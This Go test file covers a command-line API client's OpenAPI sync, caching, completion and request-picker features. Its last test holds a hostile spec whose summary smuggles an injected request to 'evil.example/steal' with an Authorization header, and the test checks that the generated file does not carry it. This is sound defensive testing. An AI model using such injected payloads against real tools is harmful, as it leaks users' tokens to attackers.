package cli

import (
	"bytes"
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

const petSpec = `{"openapi":"3.0.3","info":{"title":"Pets","version":"2"},"paths":{
  "/users":      {"get":{"summary":"List users"},"post":{"summary":"Create a user","operationId":"createUser","requestBody":{"content":{"application/json":{"schema":{"type":"object","required":["name"],"properties":{"name":{"type":"string"},"age":{"type":"integer"}}}}}}}},
  "/users/{id}": {"get":{"summary":"Get a user"},"delete":{"summary":"Delete a user"}},
  "/health":     {"get":{}}
}}`

type specSrv struct {
	*httptest.Server
	mu      sync.Mutex
	paths   []string
	auths   []string
	methods []string
	bodies  []string
}

// openapiSrv serves routes (path -> status, body) and records what it was asked.
func openapiSrv(t *testing.T, routes map[string][2]string) *specSrv {
	t.Helper()
	s := &specSrv{}
	s.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		s.mu.Lock()
		s.paths = append(s.paths, r.URL.Path)
		s.auths = append(s.auths, r.Header.Get("Authorization"))
		s.methods = append(s.methods, r.Method)
		s.bodies = append(s.bodies, string(body))
		s.mu.Unlock()
		rt, ok := routes[r.URL.Path]
		if !ok {
			w.WriteHeader(404)
			return
		}
		if rt[0] == "500" {
			w.WriteHeader(500)
		}
		_, _ = w.Write([]byte(rt[1]))
	}))
	t.Cleanup(s.Close)
	return s
}

func openapiEnv(t *testing.T, base string) string {
	t.Helper()
	cache := t.TempDir()
	t.Setenv("API_OPENAPI_CACHE_DIR", cache)
	t.Setenv("API_BASE_URL", base)
	t.Setenv("API_TOKEN", "TOK-OPENAPI")
	t.Setenv("API_ENV", "")
	t.Setenv("API_GRAPHQL_URL", "")
	return cache
}

func cachedFiles(t *testing.T, dir string) []string {
	t.Helper()
	f, _ := filepath.Glob(filepath.Join(dir, "*.json"))
	return f
}

func TestOpenAPISyncProbesCommonPathsAndCaches(t *testing.T) {
	srv := openapiSrv(t, map[string][2]string{"/swagger.json": {"200", petSpec}})
	cache := openapiEnv(t, srv.URL)

	r := run(t, "", "openapi", "sync", "-M")
	if r.code != 0 || !strings.Contains(r.err, "✓ 5 operations") {
		t.Fatalf("%+v", r)
	}
	if got := strings.Join(srv.paths, " "); got != "/openapi.json /swagger.json" {
		t.Fatalf("probed %q", got)
	}
	if srv.auths[0] != "Bearer TOK-OPENAPI" {
		t.Fatalf("the active base gets the session token: %q", srv.auths[0])
	}
	files := cachedFiles(t, cache)
	if len(files) != 1 {
		t.Fatalf("cache files: %v", files)
	}
	if st, _ := os.Stat(files[0]); st.Mode().Perm() != 0o600 {
		t.Fatalf("cache must be owner-only, got %v", st.Mode().Perm())
	}
	raw, _ := os.ReadFile(files[0])
	if strings.Contains(string(raw), "TOK-OPENAPI") || !strings.Contains(string(raw), `"/users/{id}"`) {
		t.Fatalf("cache content:\n%s", raw)
	}
}

// NestJS names its document <path>-json (SwaggerModule.setup('docs', ...) gives
// /docs-json): a stock Nest app must work without an argument.
func TestOpenAPISyncFindsNestJSDefaultNames(t *testing.T) {
	for _, path := range []string{"/docs-json", "/api-json"} {
		srv := openapiSrv(t, map[string][2]string{path: {"200", petSpec}})
		openapiEnv(t, srv.URL)
		if r := run(t, "", "openapi", "sync", "-M"); r.code != 0 || !strings.Contains(r.err, "✓ 5 operations from "+path) {
			t.Fatalf("%s: %+v", path, r)
		}
	}
}

func TestOpenAPISyncExplicitPathDoesNotProbe(t *testing.T) {
	srv := openapiSrv(t, map[string][2]string{"/docs/api.json": {"200", petSpec}, "/openapi.json": {"200", petSpec}})
	openapiEnv(t, srv.URL)
	if r := run(t, "", "openapi", "sync", "/docs/api.json", "-M"); r.code != 0 {
		t.Fatalf("%+v", r)
	}
	if strings.Join(srv.paths, " ") != "/docs/api.json" {
		t.Fatalf("%v", srv.paths)
	}
	// an explicit path that fails is an error, not a fallback
	srv.paths = nil
	if r := run(t, "", "openapi", "sync", "/nope.json", "-M"); r.code != 22 || strings.Join(srv.paths, " ") != "/nope.json" {
		t.Fatalf("%+v %v", r, srv.paths)
	}
}

func TestOpenAPISyncFromAFile(t *testing.T) {
	srv := openapiSrv(t, nil)
	cache := openapiEnv(t, srv.URL)
	f := filepath.Join(t.TempDir(), "spec.json")
	_ = os.WriteFile(f, []byte(petSpec), 0o600)
	if r := run(t, "", "openapi", "sync", "--file", f, "-M"); r.code != 0 || len(srv.paths) != 0 {
		t.Fatalf("%+v requests=%v", r, srv.paths)
	}
	if len(cachedFiles(t, cache)) != 1 {
		t.Fatal("not cached")
	}
}

func TestOpenAPISyncErrorsAreReadable(t *testing.T) {
	yaml := openapiSrv(t, map[string][2]string{"/openapi.json": {"200", "openapi: 3.0.0\ninfo:\n  title: x\npaths: {}\n"}})
	cache := openapiEnv(t, yaml.URL)
	r := run(t, "", "openapi", "sync", "-M")
	if r.code != 1 || !strings.Contains(r.err, "only JSON") || !strings.Contains(r.err, "yq") || len(cachedFiles(t, cache)) != 0 {
		t.Fatalf("yaml: %+v", r)
	}
	none := openapiSrv(t, nil)
	openapiEnv(t, none.URL)
	r = run(t, "", "openapi", "sync", "-M")
	if r.code != 1 || !strings.Contains(r.err, "no OpenAPI document found") || !strings.Contains(r.err, "/v3/api-docs") {
		t.Fatalf("all 404: %+v", r)
	}
	t.Setenv("API_BASE_URL", "")
	if r := run(t, "", "openapi", "sync", "-M"); r.code == 0 || !strings.Contains(r.err, "base URL") {
		t.Fatalf("no base: %+v", r)
	}
}

// The spec may live elsewhere (a docs host); the token is for the active base only.
func TestOpenAPISyncSendsNoTokenToAnotherHost(t *testing.T) {
	base := openapiSrv(t, nil)
	docs := openapiSrv(t, map[string][2]string{"/spec.json": {"200", petSpec}})
	openapiEnv(t, base.URL)
	if r := run(t, "", "openapi", "sync", docs.URL+"/spec.json", "-M"); r.code != 0 {
		t.Fatalf("%+v", r)
	}
	if len(docs.auths) != 1 || docs.auths[0] != "" {
		t.Fatalf("the session token went to another host: %v", docs.auths)
	}
}

func TestOpenAPISyncDryRunSendsAndWritesNothing(t *testing.T) {
	srv := openapiSrv(t, map[string][2]string{"/openapi.json": {"200", petSpec}})
	cache := openapiEnv(t, srv.URL)
	r := run(t, "", "openapi", "sync", "--dry", "-M")
	if r.code != 0 || !strings.HasPrefix(r.out, "curl ") || len(srv.paths) != 0 || len(cachedFiles(t, cache)) != 0 {
		t.Fatalf("%+v requests=%v", r, srv.paths)
	}
}

func syncedPets(t *testing.T) (*specSrv, string) {
	t.Helper()
	srv := openapiSrv(t, map[string][2]string{"/openapi.json": {"200", petSpec}, "/health": {"200", `{"ok":true}`}, "/users": {"200", `{"data":[{"id":1}]}`}, "/users/7": {"200", `{"id":7}`}})
	cache := openapiEnv(t, srv.URL)
	if r := run(t, "", "openapi", "sync", "-M"); r.code != 0 {
		t.Fatalf("sync: %+v", r)
	}
	return srv, cache
}

func TestOpenAPIList(t *testing.T) {
	syncedPets(t)
	r := run(t, "", "openapi", "list", "-M")
	for _, want := range []string{"METHOD", "GET", "/users/{id}", "Delete a user", "/health"} {
		if r.code != 0 || !strings.Contains(r.out, want) {
			t.Fatalf("lacks %q:\n%+v", want, r)
		}
	}
	if r := run(t, "", "openapi", "list", "delete", "-M"); !strings.Contains(r.out, "DELETE") || strings.Contains(r.out, "/health") {
		t.Fatalf("filter:\n%s", r.out)
	}
	if r := run(t, "", "openapi", "list", "--method", "post", "-M"); !strings.Contains(r.out, "POST") || strings.Contains(r.out, "GET") {
		t.Fatalf("--method:\n%s", r.out)
	}
}

func TestOpenAPIListWithoutACacheSaysWhatToDo(t *testing.T) {
	srv := openapiSrv(t, nil)
	openapiEnv(t, srv.URL)
	if r := run(t, "", "openapi", "list", "-M"); r.code != 1 || !strings.Contains(r.err, "api openapi sync") {
		t.Fatalf("%+v", r)
	}
}

func complete(t *testing.T, args ...string) string {
	t.Helper()
	var out, errb bytes.Buffer
	Run(context.Background(), append([]string{"__complete"}, args...), IO{In: strings.NewReader(""), Out: &out, Err: &errb})
	return out.String()
}

// Completion must stay offline and fast (CLAUDE.md gotcha 7): after a sync it
// reads one local file, so it works with the server gone, per method, and only
// for the server the spec came from.
func TestOpenAPICompletionIsOfflinePerMethodAndPerServer(t *testing.T) {
	srv, _ := syncedPets(t)
	srv.Close()

	get := complete(t, "get", "/us")
	if !strings.Contains(get, "/users\tList users") || !strings.Contains(get, "/users/{id}\tGet a user") || strings.Contains(get, "/health") {
		t.Fatalf("get:\n%s", get)
	}
	post := complete(t, "post", "/us")
	if !strings.Contains(post, "/users\tCreate a user") || strings.Contains(post, "/users/{id}") {
		t.Fatalf("post only offers POST operations:\n%s", post)
	}
	if del := complete(t, "delete", "/"); !strings.Contains(del, "/users/{id}") || strings.Contains(del, "/health") {
		t.Fatalf("delete:\n%s", del)
	}
	if noDesc := complete(t, "get", "/he"); !strings.Contains(noDesc, "/health\n") {
		t.Fatalf("an operation with no summary is a plain candidate:\n%s", noDesc)
	}
	// another server: that cache says nothing about it
	t.Setenv("API_BASE_URL", "http://other.example:9")
	if other := complete(t, "get", "/us"); strings.Contains(other, "/users") {
		t.Fatalf("a spec is only offered for the server it came from:\n%s", other)
	}
}

// env.<name>.openapi names the spec path once, for a spec that is not at one of
// the common locations. An argument still wins; without a selected env nothing
// changes (the probes run).
func TestOpenAPISyncUsesTheEnvsConfiguredPath(t *testing.T) {
	srv := openapiSrv(t, map[string][2]string{"/custom/spec.json": {"200", petSpec}, "/other.json": {"200", petSpec}, "/openapi.json": {"200", petSpec}})
	openapiEnv(t, srv.URL)
	writeConfig(t, "[env.dev]\nurl = \""+srv.URL+"\"\nopenapi = \"/custom/spec.json\"\n")

	if r := run(t, "", "--env", "dev", "openapi", "sync", "-M"); r.code != 0 || !strings.Contains(r.err, "from /custom/spec.json") {
		t.Fatalf("%+v", r)
	}
	if strings.Join(srv.paths, " ") != "/custom/spec.json" {
		t.Fatalf("a configured path is fetched alone, no probing: %v", srv.paths)
	}
	srv.paths = nil
	if r := run(t, "", "--env", "dev", "openapi", "sync", "/other.json", "-M"); r.code != 0 || strings.Join(srv.paths, " ") != "/other.json" {
		t.Fatalf("an explicit argument wins: %+v %v", r, srv.paths)
	}
	srv.paths = nil
	if r := run(t, "", "openapi", "sync", "-M"); r.code != 0 || strings.Join(srv.paths, " ") != "/openapi.json" {
		t.Fatalf("no env selected: the usual probe: %+v %v", r, srv.paths)
	}
}

func TestOpenAPIConfigPathCanBeSetFromTheCommandLine(t *testing.T) {
	srv := openapiSrv(t, nil)
	openapiEnv(t, srv.URL)
	writeConfig(t, "")
	if r := run(t, "", "config", "set", "env.dev.openapi", "/docs/spec.json", "--global"); r.code != 0 {
		t.Fatalf("%+v", r)
	}
	if r := run(t, "", "config", "get", "env.dev.openapi"); !strings.Contains(r.out, "/docs/spec.json") {
		t.Fatalf("%+v", r)
	}
	if r := run(t, "", "config", "set", "env.dev.openapi", "https://evil.example/x", "--global"); r.code == 0 {
		t.Fatalf("a URL must be refused: %+v", r)
	}
}

// ── the picker: api openapi / api openapi pick ─────────────────────────────
// pick pick-edit-save-confirm-run, like `api gql`. Index order is by path, then
// method: 1 GET /health, 2 GET /users, 3 POST /users, 4 GET /users/{id},
// 5 DELETE /users/{id}.

type pickEnvT struct {
	srv *specSrv
	dir string // the project root (saved requests go to <dir>/.api/requests)
	rec string // where the fake editor copies what it was given
}

func pickSetup(t *testing.T, line string) pickEnvT {
	t.Helper()
	dir := projectWith(t, map[string]string{".env": ""})
	srv, _ := syncedPets(t)
	rec := fakeTools(t)
	t.Setenv("FAKE_PLAIN_LINE", line)
	return pickEnvT{srv, dir, rec}
}

func (p pickEnvT) saved(t *testing.T) []string {
	t.Helper()
	f, _ := filepath.Glob(filepath.Join(p.dir, ".api", "requests", "*.http"))
	return f
}

func replaceWith(t *testing.T, body string) {
	t.Helper()
	f := filepath.Join(t.TempDir(), "edited.http")
	if err := os.WriteFile(f, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("EDITOR_REPLACE", f)
	t.Setenv("EDITOR_TOUCH", "1")
}

func TestOpenAPIPickRunsASavedGETAndKeepsTheFile(t *testing.T) {
	p := pickSetup(t, "2")
	t.Setenv("EDITOR_TOUCH", "1") // saved unchanged: run the skeleton as is
	before := len(p.srv.paths)
	r := run(t, "", "openapi", "-M")
	if r.code != 0 || len(p.srv.paths) != before+1 || p.srv.paths[before] != "/users" || p.srv.methods[before] != "GET" {
		t.Fatalf("%+v paths=%v", r, p.srv.paths)
	}
	if !strings.Contains(r.out, `"id": 1`) {
		t.Fatalf("the response is printed:\n%s", r.out)
	}
	files := p.saved(t)
	if len(files) != 1 || !strings.HasSuffix(files[0], "get-users.http") {
		t.Fatalf("saved: %v", files)
	}
	raw, _ := os.ReadFile(files[0])
	if !strings.Contains(string(raw), "GET /users") || strings.Contains(string(raw), "openapi-pick:") {
		t.Fatalf("the saved file is the request, without our instructions:\n%s", raw)
	}
	if !strings.Contains(r.err, "saved .api/requests/get-users.http") || !strings.Contains(r.err, "api run get-users") {
		t.Fatalf("the repeat command is shown:\n%s", r.err)
	}
}

func TestOpenAPIPickEditorGetsTheSkeletonAndUnsavedMeansCancel(t *testing.T) {
	p := pickSetup(t, "3") // POST /users, no EDITOR_TOUCH: quit without saving
	before := len(p.srv.paths)
	r := run(t, "", "openapi", "-M")
	if r.code != 1 || len(p.srv.paths) != before || len(p.saved(t)) != 0 || !strings.Contains(r.err, "cancelled") {
		t.Fatalf("%+v", r)
	}
	doc, _ := os.ReadFile(p.rec)
	for _, want := range []string{"### createUser", "POST /users", "Content-Type: application/json", `"name": ""`, `"age": 0`, "Create a user"} {
		if !strings.Contains(string(doc), want) {
			t.Errorf("the editor file lacks %q:\n%s", want, doc)
		}
	}
}

// Like `api gql`: what is SAVED decides whether to ask, never what you picked.
func TestOpenAPIPickAsksBeforeAnythingThatChangesData(t *testing.T) {
	p := pickSetup(t, "3") // POST /users
	t.Setenv("EDITOR_TOUCH", "1")
	before := len(p.srv.paths)

	r := run(t, "", "openapi", "-M") // no answer = no
	if r.code != 1 || len(p.srv.paths) != before || len(p.saved(t)) != 0 ||
		!strings.Contains(r.err, "✱ POST /users changes data on "+p.srv.URL+": run it? [y/N]") || !strings.Contains(r.err, "(not run") {
		t.Fatalf("%+v", r)
	}
	r = run(t, "y\n", "openapi", "-M")
	if r.code != 0 || len(p.srv.paths) != before+1 || p.srv.methods[before] != "POST" || !strings.Contains(p.srv.bodies[before], `"name"`) {
		t.Fatalf("%+v methods=%v bodies=%v", r, p.srv.methods, p.srv.bodies)
	}
	if len(p.saved(t)) != 1 {
		t.Fatalf("an answered yes saves the request: %v", p.saved(t))
	}
	before = len(p.srv.paths)
	r = run(t, "", "openapi", "--yes", "-M")
	if r.code != 0 || strings.Contains(r.err, "run it?") || len(p.srv.paths) != before+1 {
		t.Fatalf("--yes skips the question: %+v", r)
	}
}

func TestOpenAPIPickDecidesByWhatWasSavedNotWhatWasPicked(t *testing.T) {
	p := pickSetup(t, "2") // picked a GET...
	replaceWith(t, "### x\nDELETE /users/7\n")
	before := len(p.srv.paths)
	if r := run(t, "", "openapi", "-M"); r.code != 1 || len(p.srv.paths) != before || !strings.Contains(r.err, "✱ DELETE /users/7 changes data") {
		t.Fatalf("an edited-in DELETE must ask: %+v", r)
	}
	p = pickSetup(t, "3") // ...picked a POST, edited into a GET: nothing to ask
	replaceWith(t, "### x\nGET /users/7\n")
	before = len(p.srv.paths)
	if r := run(t, "", "openapi", "-M"); r.code != 0 || strings.Contains(r.err, "run it?") || p.srv.paths[before] != "/users/7" {
		t.Fatalf("%+v", r)
	}
}

func TestOpenAPIPickRefusesALeftoverPathParameter(t *testing.T) {
	p := pickSetup(t, "4") // GET /users/{id}
	t.Setenv("EDITOR_TOUCH", "1")
	before := len(p.srv.paths)
	r := run(t, "", "openapi", "-M")
	if r.code != 2 || len(p.srv.paths) != before || len(p.saved(t)) != 0 || !strings.Contains(r.err, "{id}") {
		t.Fatalf("%+v", r)
	}
	replaceWith(t, "### x\nGET /users/7\n") // fill it in: runs
	if r := run(t, "", "openapi", "-M"); r.code != 0 || p.srv.paths[len(p.srv.paths)-1] != "/users/7" {
		t.Fatalf("%+v", r)
	}
	// {{variables}} are the runner's own syntax, not a missing parameter
	replaceWith(t, "### x\n@id = 7\nGET /users/{{id}}\n")
	if r := run(t, "", "openapi", "-M"); r.code != 0 || p.srv.paths[len(p.srv.paths)-1] != "/users/7" {
		t.Fatalf("%+v", r)
	}
}

func TestOpenAPIPickNoSaveAndUniqueFileNames(t *testing.T) {
	p := pickSetup(t, "2")
	t.Setenv("EDITOR_TOUCH", "1")
	if r := run(t, "", "openapi", "--no-save", "-M"); r.code != 0 || len(p.saved(t)) != 0 {
		t.Fatalf("--no-save: %+v saved=%v", r, p.saved(t))
	}
	run(t, "", "openapi", "-M")
	run(t, "", "openapi", "-M")
	var names []string
	for _, f := range p.saved(t) {
		names = append(names, filepath.Base(f))
	}
	if strings.Join(names, ",") != "get-users-2.http,get-users.http" {
		t.Fatalf("an earlier request is never overwritten: %v", names)
	}
}

func TestOpenAPIPickPrintModeAndShow(t *testing.T) {
	p := pickSetup(t, "3")
	before := len(p.srv.paths)
	if r := run(t, "", "openapi", "pick", "--print", "-M"); r.code != 0 || strings.TrimSpace(r.out) != "api post /users '{}'" || len(p.srv.paths) != before {
		t.Fatalf("%+v", r)
	}
	if _, err := os.Stat(p.rec); err == nil {
		t.Fatal("--print must not open the editor")
	}
	t.Setenv("FAKE_PLAIN_LINE", "4")
	if r := run(t, "", "openapi", "pick", "--print", "-M"); strings.TrimSpace(r.out) != "api get '/users/{id}'" || !strings.Contains(r.err, "{id}") {
		t.Fatalf("%+v", r)
	}
	r := run(t, "", "openapi", "show", "POST", "/users", "-M")
	for _, want := range []string{"POST /users", "Create a user", "createUser", `"name": ""`} {
		if r.code != 0 || !strings.Contains(r.out, want) {
			t.Fatalf("show lacks %q:\n%+v", want, r)
		}
	}
	if r := run(t, "", "openapi", "show", "GET", "/nope", "-M"); r.code != 1 {
		t.Fatalf("%+v", r)
	}
}

func TestOpenAPIPickFilterCancelAndMissingPieces(t *testing.T) {
	p := pickSetup(t, "1")
	t.Setenv("EDITOR_TOUCH", "1")
	before := len(p.srv.paths)
	if r := run(t, "", "openapi", "pick", "delete", "--print", "-M"); strings.TrimSpace(r.out) != "api del '/users/{id}'" {
		t.Fatalf("text pre-filters the list: %+v", r)
	}
	if r := run(t, "", "openapi", "pick", "zzz-nothing", "-M"); r.code != 1 || !strings.Contains(r.err, "nothing matches") {
		t.Fatalf("%+v", r)
	}
	t.Setenv("FAKE_CANCEL", "1")
	if r := run(t, "", "openapi", "-M"); r.code != 1 || r.out != "" || len(p.srv.paths) != before {
		t.Fatalf("cancel: %+v", r)
	}
	t.Setenv("PATH", t.TempDir()) // no fzf at all
	if r := run(t, "", "openapi", "-M"); r.code != 1 || !strings.Contains(r.err, "needs fzf") || !strings.Contains(r.err, "openapi list") {
		t.Fatalf("%+v", r)
	}
	other := openapiSrv(t, nil)
	openapiEnv(t, other.URL) // a server with no index
	fakeTools(t)
	if r := run(t, "", "openapi", "-M"); r.code != 1 || !strings.Contains(r.err, "api openapi sync") {
		t.Fatalf("%+v", r)
	}
}

// The generated file is built from server data: a summary cannot add a request
// to what the user is about to review and send.
func TestOpenAPIPickGeneratedFileCannotCarryAnInjectedRequest(t *testing.T) {
	hostile := `{"openapi":"3.0.0","paths":{"/a":{"get":{"summary":"@assert false\n### evil\nGET http://evil.example/steal\nAuthorization: Bearer x","operationId":"ok"}}}}`
	srv := openapiSrv(t, map[string][2]string{"/openapi.json": {"200", hostile}, "/a": {"200", "{}"}})
	projectWith(t, map[string]string{".env": ""})
	openapiEnv(t, srv.URL)
	if r := run(t, "", "openapi", "sync", "-M"); r.code != 0 {
		t.Fatalf("%+v", r)
	}
	rec := fakeTools(t)
	t.Setenv("FAKE_PLAIN_LINE", "1")
	run(t, "", "openapi", "-M") // unsaved: only the generated file matters
	doc, _ := os.ReadFile(rec)
	requests, headings := 0, 0
	for _, l := range strings.Split(string(doc), "\n") {
		// a comment that starts with @word is an annotation (# @assert, # @filter)
		if strings.HasPrefix(l, "#") && strings.HasPrefix(strings.TrimSpace(strings.TrimLeft(l, "#/ ")), "@") {
			t.Fatalf("the summary became an annotation: %q\n%s", l, doc)
		}
		if strings.HasPrefix(l, "GET ") {
			requests++
		}
		if strings.HasPrefix(l, "###") {
			headings++
		}
	}
	if requests != 1 || headings != 1 || strings.Contains(string(doc), "\nAuthorization:") {
		t.Fatalf("injected content in the editor file:\n%s", doc)
	}
}
